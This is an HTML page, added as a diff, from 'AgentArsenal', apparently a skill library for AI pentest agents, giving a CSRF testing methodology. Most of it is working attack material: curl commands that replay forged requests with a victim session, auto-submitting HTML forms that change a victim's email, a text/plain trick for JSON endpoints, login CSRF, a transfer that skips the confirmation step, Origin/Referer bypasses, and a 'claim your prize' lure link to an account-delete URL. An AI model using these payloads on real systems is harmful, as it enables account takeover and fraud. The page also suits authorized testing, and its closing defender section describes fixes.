@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: csrf</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>csrf</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing a web application for Cross-Site Request Forgery</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a> <a href="auth-attacks.html">auth-attacks</a> <a href="web-xss.html">web-xss</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Cross-Site Request Forgery (CSRF) tricks a logged-in user&#x27;s browser into sending a request the user never intended, riding on the victim&#x27;s session. This skill covers the full authorized methodology: finding state-changing requests, testing token defenses, building proof-of-concept exploits, and bypassing common CSRF protections. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Proxy all traffic and list every state-changing request (POST, PUT,</li>
+<p>PATCH, DELETE, and GET requests that change data).</p>
+<li>Check each request for an anti-CSRF token: a random per-request value in</li>
+<p>a hidden field, header, or double-submit cookie.</p>
+<li>Inspect the session cookie attributes: SameSite, Secure, HttpOnly, and</li>
+<p>Path.</p>
+<li>Remove or replay the token to test whether the server actually validates</li>
+<p>it.</p>
+<li>Build a minimal HTML proof of concept that auto-submits the forged</li>
+<p>request cross-site.</p>
+<li>Test Referer and Origin based defenses for bypasses (missing header,</li>
+<p>subdomain, crafted suffix).</p>
+<li>Test token validation flaws: tokens tied to session only, predictable</li>
+<p>tokens, tokens not bound to the user, and tokens accepted via GET.</p>
+<li>Confirm impact by showing the state change lands on the victim account,</li>
+<p>then document the request and response pair.</p>
+</ol>
+<h2>1. Mapping state-changing requests</h2>
+<p>CSRF only matters where a request changes something: password changes, email changes, transfers, profile updates, admin actions, API mutations. Walk the application in Burp with the proxy on and flag every such request.</p>
+<pre><code class="language-bash"># List candidate requests from a Burp-exported history or access log:
+# look for POST/PUT/PATCH/DELETE and GET requests with side effects
+grep -E &#x27;&quot;(POST|PUT|PATCH|DELETE) &#x27; /tmp/access.log | awk &#x27;{print $6, $7}&#x27; | sort -u | head -30</code></pre>
+<pre><code class="language-bash"># Quick check: does a state-changing endpoint also work over GET?
+# (GET endpoints that change state are trivially CSRF-able via &lt;img&gt;)
+curl -s -b &quot;session=VICTIMSESSION&quot; \
+  &#x27;https://target.example/account/change-email?email=attacker@example.com&#x27; \
+  -o /dev/null -w &#x27;%{http_code}\n&#x27;</code></pre>
+<p>Record for each request: the method, the parameters, whether a token is present, and the cookie attributes from the Set-Cookie response headers.</p>
+<pre><code class="language-bash"># Inspect cookie attributes the server sets
+curl -s -D - &#x27;https://target.example/login&#x27; -o /dev/null | grep -i &#x27;^set-cookie&#x27;</code></pre>
+<h2>2. Token validation testing</h2>
+<p>A token only protects if the server checks it correctly. Test each of these, one change at a time, replaying the request with curl.</p>
+<pre><code class="language-bash"># Baseline: capture a valid request from Burp, save it, then replay it
+curl -s -X POST &#x27;https://target.example/account/email&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -d &#x27;email=victim@example.com&amp;csrf=VALIDTOKEN123&#x27; \
+  -o /tmp/base.html -w &#x27;baseline: %{http_code}\n&#x27;
+
+# Test 1: token removed entirely
+curl -s -X POST &#x27;https://target.example/account/email&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -d &#x27;email=attacker@example.com&#x27; \
+  -w &#x27;no-token: %{http_code}\n&#x27; -o /dev/null
+
+# Test 2: empty token
+curl -s -X POST &#x27;https://target.example/account/email&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -d &#x27;email=attacker@example.com&amp;csrf=&#x27; \
+  -w &#x27;empty-token: %{http_code}\n&#x27; -o /dev/null
+
+# Test 3: wrong token value
+curl -s -X POST &#x27;https://target.example/account/email&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -d &#x27;email=attacker@example.com&amp;csrf=wrongvalue&#x27; \
+  -w &#x27;bad-token: %{http_code}\n&#x27; -o /dev/null
+
+# Test 4: another user&#x27;s valid token (is the token bound to the session?)
+curl -s -X POST &#x27;https://target.example/account/email&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -d &#x27;email=attacker@example.com&amp;csrf=OTHERUSERSTOKEN&#x27; \
+  -w &#x27;cross-user-token: %{http_code}\n&#x27; -o /dev/null</code></pre>
+<p>Compare each response code and body against the baseline. If any test succeeds (same state change as baseline), the token check is broken.</p>
+<p>Further checks:</p>
+<pre><code class="language-bash"># Is the token accepted as a GET parameter too? (leaks in logs and Referer)
+curl -s &#x27;https://target.example/account/email?email=attacker@example.com&amp;csrf=VALIDTOKEN123&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; -o /dev/null -w &#x27;token-in-get: %{http_code}\n&#x27;
+
+# Is the token predictable? Request several tokens and look for a pattern
+for i in 1 2 3 4 5; do
+  curl -s -b &#x27;session=VICTIMSESSION&#x27; &#x27;https://target.example/account/settings&#x27; \
+    | grep -o &#x27;csrf[^&gt;]*value=&quot;[^&quot;]*&quot;&#x27; | head -1
+done</code></pre>
+<p>Predictable tokens (timestamps, sequential IDs, MD5 of the username) let an attacker forge requests without ever reading the victim&#x27;s page.</p>
+<h2>3. SameSite cookie testing</h2>
+<p>SameSite=Lax (the modern default) blocks cross-site POST cookies but still allows top-level GET. SameSite=None requires Secure. Test what the cookie actually enforces.</p>
+<pre><code class="language-bash"># Confirm the exact cookie flags the application sets
+curl -s -I &#x27;https://target.example/&#x27; | grep -i &#x27;set-cookie&#x27;</code></pre>
+<p>Key test cases:</p>
+<ul>
+<li>Cookie has no SameSite attribute: the browser sends it on every</li>
+<p>cross-site request, so classic CSRF works if no token exists.</p>
+<li>SameSite=Lax: a cross-site POST is blocked, but a state-changing GET</li>
+<p>still carries the cookie when reached by top-level navigation (a link click, not an <code>&lt;img&gt;</code>).</p>
+<li>SameSite=None without Secure: browsers reject the cookie, which can</li>
+<p>break sessions in odd ways worth noting.</p>
+<li>Two cookies set for the same name (one Lax, one None): some frameworks</li>
+<p>do this for compatibility; test which one the server honors.</p>
+</ul>
+<p>You cannot change the victim&#x27;s browser, so document the observed attributes and match the proof of concept to what the browser will allow.</p>
+<h2>4. Referer and Origin check bypasses</h2>
+<p>Some applications skip tokens and instead check the Referer or Origin header. These checks are often bypassable.</p>
+<pre><code class="language-bash"># Baseline with a correct Origin
+curl -s -X POST &#x27;https://target.example/account/email&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -H &#x27;Origin: https://target.example&#x27; \
+  -d &#x27;email=victim@example.com&#x27; -o /dev/null -w &#x27;good-origin: %{http_code}\n&#x27;
+
+# Missing Origin header (some apps allow it for &quot;privacy&quot; reasons)
+curl -s -X POST &#x27;https://target.example/account/email&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -d &#x27;email=attacker@example.com&#x27; -o /dev/null -w &#x27;no-origin: %{http_code}\n&#x27;
+
+# Attacker origin
+curl -s -X POST &#x27;https://target.example/account/email&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -H &#x27;Origin: https://evil.example&#x27; \
+  -d &#x27;email=attacker@example.com&#x27; -o /dev/null -w &#x27;evil-origin: %{http_code}\n&#x27;
+
+# Subdomain of the target (often allow-listed by mistake)
+curl -s -X POST &#x27;https://target.example/account/email&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -H &#x27;Origin: https://target.example.evil.example&#x27; \
+  -d &#x27;email=attacker@example.com&#x27; -o /dev/null -w &#x27;suffix-bypass: %{http_code}\n&#x27;
+
+# Referer pointing at an attacker page under a trusted prefix
+curl -s -X POST &#x27;https://target.example/account/email&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -H &#x27;Referer: https://target.example@evil.example/&#x27; \
+  -d &#x27;email=attacker@example.com&#x27; -o /dev/null -w &#x27;referer-trick: %{http_code}\n&#x27;</code></pre>
+<p>Watch for naive string matching: <code>endswith(&quot;target.example&quot;)</code> accepts <code>target.example.evil.example</code>, and <code>contains(&quot;target.example&quot;)</code> accepts almost anything. Also test the case where both headers are stripped by a <code>&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</code> on the attack page, since the server may treat a missing header as acceptable.</p>
+<h2>5. Building the proof of concept</h2>
+<p>A proof of concept must run from an attacker-controlled origin and submit without user interaction. Serve it over HTTPS on a domain you control.</p>
+<pre><code class="language-html">&lt;!-- /tmp/csrf-poc.html: auto-submitting POST proof of concept --&gt;
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;form id=&quot;f&quot; action=&quot;https://target.example/account/email&quot; method=&quot;POST&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;attacker@example.com&quot;&gt;
+    &lt;/form&gt;
+    &lt;script&gt;document.getElementById(&quot;f&quot;).submit();&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<pre><code class="language-bash"># Serve the PoC and test it yourself with a logged-in test browser
+cd /tmp &amp;&amp; python3 -m http.server 8443 --bind 127.0.0.1 &amp;
+# Open http://127.0.0.1:8443/csrf-poc.html in a browser logged into
+# the target as the VICTIM test account, then verify the email changed.</code></pre>
+<p>For JSON APIs, a plain form cannot set <code>Content-Type: application/json</code>, so test whether the endpoint also accepts form encoding:</p>
+<pre><code class="language-bash"># Does the JSON endpoint accept urlencoded bodies? (many frameworks do)
+curl -s -X POST &#x27;https://target.example/api/email&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+  -d &#x27;email=attacker@example.com&#x27; -o /dev/null -w &#x27;form-to-json-api: %{http_code}\n&#x27;</code></pre>
+<p>If it does, the form PoC works. If it strictly requires JSON, CSRF is harder: test with <code>text/plain</code> (a form can send that via <code>enctype=&quot;text/plain&quot;</code>) and see if the server still parses the body as JSON.</p>
+<pre><code class="language-html">&lt;!-- text/plain trick for JSON endpoints that are lenient parsers --&gt;
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;form id=&quot;f&quot; action=&quot;https://target.example/api/email&quot; method=&quot;POST&quot;
+          enctype=&quot;text/plain&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&#x27;{&quot;email&quot;:&quot;attacker@example.com&quot;,&quot;x&quot;:&quot;&#x27;
+             value=&#x27;&quot;}&#x27;&gt;
+    &lt;/form&gt;
+    &lt;script&gt;document.getElementById(&quot;f&quot;).submit();&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<h2>6. Login CSRF</h2>
+<p>Login CSRF forces the victim&#x27;s browser to log in as the attacker. The victim then types real data (payment details, private notes) into the attacker&#x27;s account. Test whether the login form has token protection.</p>
+<pre><code class="language-bash"># Submit a login cross-site with the attacker&#x27;s credentials
+curl -s -X POST &#x27;https://target.example/login&#x27; \
+  -c /tmp/victim.jar \
+  -d &#x27;username=attacker&amp;password=AttackerPass1!&#x27; \
+  -o /dev/null -w &#x27;login-no-token: %{http_code}\n&#x27;</code></pre>
+<p>If the login succeeds without a token, build the same auto-submit PoC pointing at <code>/login</code> with the attacker&#x27;s credentials, then document the session-fixation style impact: anything the victim enters afterwards is visible to the attacker by logging in as themselves.</p>
+<h2>7. GET-based and multi-step flows</h2>
+<p>Some applications split an action across steps (confirm page, then execute). Test whether the final step alone is enough.</p>
+<pre><code class="language-bash"># Skip the confirmation step: call the final endpoint directly
+curl -s -X POST &#x27;https://target.example/transfer/confirm&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -d &#x27;to=attacker&amp;amount=100&#x27; -o /dev/null -w &#x27;skip-confirm: %{http_code}\n&#x27;</code></pre>
+<p>Also check state-changing GETs reachable by top-level navigation under SameSite=Lax, which still sends cookies on a clicked link:</p>
+<pre><code class="language-html">&lt;!-- Lax bypass: a normal link click is top-level navigation, cookie sent --&gt;
+&lt;a href=&quot;https://target.example/account/delete?confirm=yes&quot;&gt;
+  Click to claim your prize
+&lt;/a&gt;</code></pre>
+<h2>Edge cases</h2>
+<ul>
+<li>The token is validated but also sent as a cookie (double submit). Try</li>
+<p>setting both the cookie and the parameter to the same attacker-chosen value; if the server only checks they match, you can forge requests freely.</p>
+<li>Token is per-session, not per-request. Replaying your own token in the</li>
+<p>victim&#x27;s session still fails the binding test, but a token leaked anywhere (logs, Referer, browser history) stays valid for the whole session, so note the exposure window.</p>
+<li>CORS <code>Access-Control-Allow-Origin: *</code> with credentials is a different</li>
+<p>bug (CORS misconfiguration), not CSRF; do not conflate them in the report.</p>
+<li>The application uses a custom header (for example <code>X-Requested-With</code>)</li>
+<p>as its CSRF defense. Browsers block cross-site JavaScript from setting custom headers without a preflight, so this is a valid defense unless the server also accepts the request without the header.</p>
+<li>Flash or plugin-based bypasses are dead; do not waste time on them.</li>
+<li>SameSite=Lax-by-default in the browser does not protect users on older</li>
+<p>browsers. Mention the residual risk but do not claim full exploitability on modern browsers when Lax blocks your PoC.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Token validation passes inconsistently: the server may check the token</li>
+<p>only on some code paths. Map every alias of the endpoint (trailing slash, <code>.json</code> suffix, HTTP method override via <code>_method</code> parameter) and test each one.</p>
+<li>The token is bound to the session but the session identifier is</li>
+<p>predictable or fixable: chain with session fixation to plant a known session, then the token check passes because the session is yours.</p>
+<li>Referer checks strip to the registrable domain: try an attacker</li>
+<p>subdomain under a trusted parent if the app allows user subdomains.</p>
+<li>The PoC is blocked by a strict Content Security Policy on the</li>
+<p>*attack* page: host the PoC without inline scripts (use an external script file or a meta refresh form) so your own CSP does not break the demo.</p>
+<li>JSON-only endpoints: probe for method override (`X-HTTP-Method-Override:</li>
+<p>POST` on a GET) or content-type confusion before declaring it safe.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see CSRF as state-changing requests arriving with no valid token, or with tokens that fail validation, often from users who clicked a link moments earlier. Logs show the malicious request&#x27;s Referer or Origin pointing at an unrelated domain, which is the clearest signal. The durable fix is a per-request unpredictable token bound to the user session, validated on every state-changing request, plus <code>SameSite=Lax</code> (or Strict for sensitive actions) on session cookies. Tokens must be single-use or rotated, never accepted via GET, and never leaked into URLs. Referer and Origin checks are defense in depth, not a replacement for tokens. For APIs consumed by browsers, require a custom header or use SameSite cookies with strict settings.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): abusing exposed</li>
+<p>state-changing endpoints.</p>
+<li>MITRE ATT&amp;CK T1539 (Steal Web Session Cookie): related session attacks.</li>
+<li>CWE-352 (Cross-Site Request Forgery).</li>
+<li>CWE-1275 (Sensitive Cookie with Improper SameSite Attribute).</li>
+<li>CWE-642 (External Control of Critical State Data): login CSRF class.</li>
+<li>OWASP Testing Guide: Testing for Cross Site Request Forgery</li>
+<p>(OTG-SESS-005).</p>
+<li>OWASP CSRF Prevention Cheat Sheet.</li>
+<li>PortSwigger Web Security Academy: CSRF labs and cheat sheet.</li>
+<li>MDN: Set-Cookie SameSite attribute documentation.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
